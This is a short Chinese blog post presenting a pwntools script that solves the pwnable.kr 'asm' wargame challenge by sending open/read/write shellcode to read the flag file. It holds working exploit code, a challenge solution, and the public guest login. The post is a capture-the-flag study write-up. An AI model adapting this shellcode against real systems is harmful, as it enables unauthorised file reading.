---
title: pwnable.kr之asm
date: 2017-09-29 16:12:29
tags: 
 - shellcode
 - pwnable.kr
 - pwntools
---



> 这道题考查写shellcode, 用keystone折腾了半天上网一查发现我们对pwntools的运用真的不够熟练

```python
from pwn import *

con = ssh(host='pwnable.kr', user='asm', password='guest', port=2222)
p = con.connect_remote('localhost', 9026)

context(os='linux', arch='amd64')
shellcode = ""
shellcode += shellcraft.pushstr('this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong')
shellcode += shellcraft.open('rsp', 0, 0)
shellcode += shellcraft.read('rax', 'rsp', 100)
shellcode += shellcraft.write(1, 'rsp', 100)

p.recvuntil('shellcode: ')
p.send(asm(shellcode))
print p.recvline()

```

所有的系统调用都可以直接生产, ssh也可以连过去, 另外需要注意的就是context很重要.